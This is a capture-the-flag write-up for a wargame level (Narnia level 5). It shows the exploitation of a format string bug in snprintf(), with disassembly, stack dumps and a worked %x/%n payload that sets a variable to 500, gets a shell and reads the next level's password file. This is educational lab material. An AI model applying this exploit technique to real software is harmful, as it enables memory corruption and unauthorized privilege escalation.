The challenge for this level is to change the integer “i” from 1 to 500, if so we get the shell. The snprintf() appears to be the vulnerable function in this challenge, which would mean that it is a format string vulnerability challenge. Having a look at the reference for the function, http://www.cplusplus.com/reference/cstdio/snprintf/, we can see that no format parameter was included verifying the suspicious of the snprintf(). Another thing to note before continuing on is that the maximum size for our input for this challenge is 64 characters, if we include input of over 64 bytes in size as the argument passed to the binary, we will cause a Segmentation fault error. With this all worked out let’s begin working on a solution.

```
narnia5@melinda:/narnia$ ./narnia5 AAAA%x%x%x%x%x%x%x%x%x
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAAf7e5efc380482610ca00001ffffd8f42fffffd73c41414141] (53)
i = 1 (0xffffd72c)
```

So I found that after a 4 byte string followed by 9 (%x)’s I was able to see the 4 bytes on stack, the %x format specifier is used to read bytes off the stack. The next step I took was to execute the binary inside of GDB, to begin with I disassembled the main function and put a breakpoint on the snprintf() and then ran the same input as before.

```
narnia5@melinda:/narnia$ gdb -q ./narnia5
Reading symbols from /games/narnia/narnia5...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     push   %edi
   0x08048448 <+4>:     and    $0xfffffff0,%esp
   0x0804844b <+7>:     sub    $0x70,%esp
   0x0804844e <+10>:    movl   $0x1,0x6c(%esp)
   0x08048456 <+18>:    mov    0xc(%ebp),%eax
   0x08048459 <+21>:    add    $0x4,%eax
   0x0804845c <+24>:    mov    (%eax),%eax
   0x0804845e <+26>:    mov    %eax,0x8(%esp)
   0x08048462 <+30>:    movl   $0x40,0x4(%esp)
   0x0804846a <+38>:    lea    0x2c(%esp),%eax
   0x0804846e <+42>:    mov    %eax,(%esp)
   0x08048471 <+45>:    call   0x8048380 <snprintf@plt>     // Argument input
   0x08048476 <+50>:    movb   $0x0,0x6b(%esp)
   0x0804847b <+55>:    mov    $0x80485f0,%eax
   0x08048480 <+60>:    mov    %eax,(%esp)
   0x08048483 <+63>:    call   0x8048330 <printf@plt>
   0x08048488 <+68>:    mov    0x6c(%esp),%eax
   0x0804848c <+72>:    cmp    $0x1f4,%eax                    // Compare (cmp) instruction to check the %eax register's value against 0x1fa (500).
   0x08048491 <+77>:    jne    0x80484ab <main+103>         // If the values aren't equal then the JNE (Jump Not Equal) instruction is taken.
   0x08048493 <+79>:    movl   $0x8048611,(%esp)
   0x0804849a <+86>:    call   0x8048340 <puts@plt>
   0x0804849f <+91>:    movl   $0x8048616,(%esp)
   0x080484a6 <+98>:    call   0x8048350 <system@plt>
   0x080484ab <+103>:   movl   $0x8048620,(%esp)          // The JNE instruction jumps to this location.
   0x080484b2 <+110>:   call   0x8048340 <puts@plt>
   0x080484b7 <+115>:   lea    0x2c(%esp),%eax
   0x080484bb <+119>:   movl   $0xffffffff,0x1c(%esp)
   0x080484c3 <+127>:   mov    %eax,%edx
   0x080484c5 <+129>:   mov    $0x0,%eax
   0x080484ca <+134>:   mov    0x1c(%esp),%ecx
   0x080484ce <+138>:   mov    %edx,%edi
   0x080484d0 <+140>:   repnz scas %es:(%edi),%al
   0x080484d2 <+142>:   mov    %ecx,%eax
   0x080484d4 <+144>:   not    %eax
   0x080484d6 <+146>:   lea    -0x1(%eax),%edx
   0x080484d9 <+149>:   mov    $0x8048641,%eax
   0x080484de <+154>:   mov    %edx,0x8(%esp)
   0x080484e2 <+158>:   lea    0x2c(%esp),%edx
   0x080484e6 <+162>:   mov    %edx,0x4(%esp)
   0x080484ea <+166>:   mov    %eax,(%esp)
   0x080484ed <+169>:   call   0x8048330 <printf@plt>
   0x080484f2 <+174>:   mov    0x6c(%esp),%edx
   0x080484f6 <+178>:   mov    $0x8048655,%eax
   0x080484fb <+183>:   lea    0x6c(%esp),%ecx
   0x080484ff <+187>:   mov    %ecx,0x8(%esp)
   0x08048503 <+191>:   mov    %edx,0x4(%esp)
   0x08048507 <+195>:   mov    %eax,(%esp)
   0x0804850a <+198>:   call   0x8048330 <printf@plt>
   0x0804850f <+203>:   mov    $0x0,%eax
   0x08048514 <+208>:   mov    -0x4(%ebp),%edi
   0x08048517 <+211>:   leave
   0x08048518 <+212>:   ret
End of assembler dump.
```

```
(gdb) br *0x08048471
Breakpoint 1 at 0x8048471
(gdb) r AAAA%x%x%x%x%x%x%x%x%x
Starting program: /games/narnia/narnia5 AAAA%x%x%x%x%x%x%x%x%x
 
Breakpoint 1, 0x08048471 in main ()
(gdb) x/50wx $esp
0xffffd6a0:     0xffffd6cc      0x00000040      0xffffd8f0      0xf7e5efc3
0xffffd6b0:     0x08048261      0x00000000      0x00ca0000      0x00000001
0xffffd6c0:     0xffffd8da      0x0000002f      0xffffd71c      0xf7fceff4
0xffffd6d0:     0x08048520      0x08049840      0x00000002      0x08048319
0xffffd6e0:     0xf7fcf3e4      0x00008000      0x08049840      0x08048541
0xffffd6f0:     0xffffffff      0xf7e5f116      0xf7fceff4      0xf7e5f1a5
0xffffd700:     0xf7feb660      0x00000000      0x08048529      0x00000001
0xffffd710:     0x08048520      0x00000000      0x00000000      0xf7e454b3
0xffffd720:     0x00000002      0xffffd7b4      0xffffd7c0      0xf7fd3000
0xffffd730:     0x00000000      0xffffd71c      0xffffd7c0      0x00000000
0xffffd740:     0x0804822c      0xf7fceff4      0x00000000      0x00000000
0xffffd750:     0x00000000      0x4e48b022      0x794e1432      0x00000000
0xffffd760:     0x00000000      0x00000000
(gdb) ni
0x08048476 in main ()
(gdb) x/50wx $esp
0xffffd6a0:     0xffffd6cc      0x00000040      0xffffd8f0      0xf7e5efc3
0xffffd6b0:     0x08048261      0x00000000      0x00ca0000      0x00000001
0xffffd6c0:     0xffffd8da      0x0000002f      0xffffd71c      0x41414141 <- The 4 A's
0xffffd6d0:     0x35653766      0x33636665      0x38343038      0x30313632
0xffffd6e0:     0x30306163      0x66313030      0x64666666      0x32616438
0xffffd6f0:     0x66666666      0x31376466      0x34313463      0x34313431
0xffffd700:     0xf7fe0031      0x00000000      0x08048529      0x00000001
0xffffd710:     0x08048520      0x00000000      0x00000000      0xf7e454b3
0xffffd720:     0x00000002      0xffffd7b4      0xffffd7c0      0xf7fd3000
0xffffd730:     0x00000000      0xffffd71c      0xffffd7c0      0x00000000
0xffffd740:     0x0804822c      0xf7fceff4      0x00000000      0x00000000
0xffffd750:     0x00000000      0x4e48b022      0x794e1432      0x00000000
0xffffd760:     0x00000000      0x00000000
```

After a moments thought it occurred to me that the 4 “\x41” were placed onto the stack at 0xffffd6cc, but the “1” value for the i integer is at 0xffffd70c.

```
(gdb) x/50wx $esp
0xffffd6a0:     0xffffd6cc      0x00000040      0xffffd8ee      0xf7e5efc3
0xffffd6b0:     0x08048261      0x00000000      0x00ca0000      0x00000001
0xffffd6c0:     0xffffd8d8      0x0000002f      0xffffd71c      0x41414141 <- The 4 A's
0xffffd6d0:     0x35653766      0x33636665      0x38343038      0x30313632
0xffffd6e0:     0x30306163      0x66313030      0x64666666      0x32386438
0xffffd6f0:     0x66666666      0x31376466      0x34313463      0x34313431
0xffffd700:     0xf7fe0031      0x00000000      0x08048529      0x00000001 <- the value for i
0xffffd710:     0x08048520      0x00000000      0x00000000      0xf7e454b3
0xffffd720:     0x00000002      0xffffd7b4      0xffffd7c0      0xf7fd3000
0xffffd730:     0x00000000      0xffffd71c      0xffffd7c0      0x00000000
0xffffd740:     0x0804822c      0xf7fceff4      0x00000000      0x00000000
0xffffd750:     0x00000000      0x1a239250      0x2d253640      0x00000000
0xffffd760:     0x00000000      0x00000000
(gdb) c
Continuing.
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAAf7e5efc380482610ca00001ffffd8d82fffffd71c41414141] (53)
i = 1 (0xffffd70c)
[Inferior 1 (process 6017) exited normally]
```

This because of this, I need to work out how I can write to the stack is a specific location (0xffffd70c), so I started trying to use a similar method the one I used to solve level 9 of the SmashTheStack IO series of challenges. However this didn’t work out for me, a month of so after my last attempt to solve this challenge I was contacted by hakan, who helped me onto the right path needed to solve this challenge.

He pointed out that if 9 “%x” allows me to read the first 4 bytes back off the stack, 8 would allow me to write to the stack. This meant if I replaced one of the “%x” for a “%n” I would be able to change the value of i. This also meant I need to change the 4 “A”s to the memory address of where i is located.
```
narnia5@melinda:/narnia$ gdb -q ./narnia5
Reading symbols from /games/narnia/narnia5...(no debugging symbols found)...done.
(gdb) br *0x08048471
Breakpoint 1 at 0x8048471
(gdb) br *0x0804848c
Breakpoint 2 at 0x804848c
(gdb) r $(python -c 'print "\x0c\xd7\xff\xff"')%x%x%x%x%x%x%x%x%n
Starting program: /games/narnia/narnia5 $(python -c 'print "\x0c\xd7\xff\xff"')%x%x%x%x%x%x%x%x%n
 
Breakpoint 1, 0x08048471 in main ()
(gdb) x/50wx $esp
0xffffd6a0:     0xffffd6cc      0x00000040      0xffffd8f0      0xf7e5efc3
0xffffd6b0:     0x08048261      0x00000000      0x00ca0000      0x00000001
0xffffd6c0:     0xffffd8da      0x0000002f      0xffffd71c      0xf7fceff4
0xffffd6d0:     0x08048520      0x08049840      0x00000002      0x08048319
0xffffd6e0:     0xf7fcf3e4      0x00008000      0x08049840      0x08048541
0xffffd6f0:     0xffffffff      0xf7e5f116      0xf7fceff4      0xf7e5f1a5
0xffffd700:     0xf7feb660      0x00000000      0x08048529      0x00000001  <- Before the snprintf() is called
0xffffd710:     0x08048520      0x00000000      0x00000000      0xf7e454b3
0xffffd720:     0x00000002      0xffffd7b4      0xffffd7c0      0xf7fd3000
0xffffd730:     0x00000000      0xffffd71c      0xffffd7c0      0x00000000
0xffffd740:     0x0804822c      0xf7fceff4      0x00000000      0x00000000
0xffffd750:     0x00000000      0x9af939a3      0xadff9db3      0x00000000
0xffffd760:     0x00000000      0x00000000
(gdb) ni
0x08048476 in main ()
(gdb) x/50wx $esp
0xffffd6a0:     0xffffd6cc      0x00000040      0xffffd8f0      0xf7e5efc3
0xffffd6b0:     0x08048261      0x00000000      0x00ca0000      0x00000001
0xffffd6c0:     0xffffd8da      0x0000002f      0xffffd71c      0xffffd70c
0xffffd6d0:     0x35653766      0x33636665      0x38343038      0x30313632
0xffffd6e0:     0x30306163      0x66313030      0x64666666      0x32616438
0xffffd6f0:     0x66666666      0x31376466      0xf7fc0063      0xf7e5f1a5
0xffffd700:     0xf7feb660      0x00000000      0x08048529      0x0000002d  <- After the snprintf() is called
0xffffd710:     0x08048520      0x00000000      0x00000000      0xf7e454b3
0xffffd720:     0x00000002      0xffffd7b4      0xffffd7c0      0xf7fd3000
0xffffd730:     0x00000000      0xffffd71c      0xffffd7c0      0x00000000
0xffffd740:     0x0804822c      0xf7fceff4      0x00000000      0x00000000
0xffffd750:     0x00000000      0x9af939a3      0xadff9db3      0x00000000
0xffffd760:     0x00000000      0x00000000
(gdb) c
Continuing.
 
Breakpoint 2, 0x0804848c in main ()
(gdb) c
Continuing.
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [
×ÿÿf7e5efc380482610ca00001ffffd8da2fffffd71c] (45)
i = 45 (0xffffd70c)
[Inferior 1 (process 30980) exited normally]
(gdb)
```

As you can see in the above output from GDB before and after the snprintf() is called, in the output after the call is made you can see that the value has been changed from a 0x01 to 0x2D (55). In previous outputs of viewing the ESP register in GDB, we can verify that this is because of the new argument passed to the binary that was used.

NOTE: Notice how “$(python -c ‘print “\x0c\xd7\xff\xff”‘)” in the argument followed by “%x%x%x%x%x%x%x%x%n”. This is because we want to write the memory location as the first 4 bytes of the argument but if we pass the memory location to the binary as “\x0c\xd7\xff\xff” it would not understand this is 4 bytes and we would cause the application to crash as we would exceed the input buffer size.

So we are now able to modify the value of i from 1 to 45, but we need to change i to 500. So if we specify the value to write to the memory location by replacing the last “%x” again with value to write we can control the value written to i.

```
narnia5@melinda:/narnia$ ./narnia5 $(python -c 'print "\x2c\xd7\xff\xff"')%x%x%x%x%x%x%x%500u%n
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [,×ÿÿf7e5efc380482610ca00001ffffd8f12f                          ] (63)
i = 537 (0xffffd72c)
```

And so the final part is to do 500-37 to work out the correct value to write.

```
narnia5@melinda:/narnia$ ./narnia5 $(python -c 'print "\x2c\xd7\xff\xff"')%x%x%x%x%x%x%x%463u%n
Change i's value from 1 -> 500. GOOD
$ whoami
narnia6
$ cat /etc/narnia_pass/narnia6
```
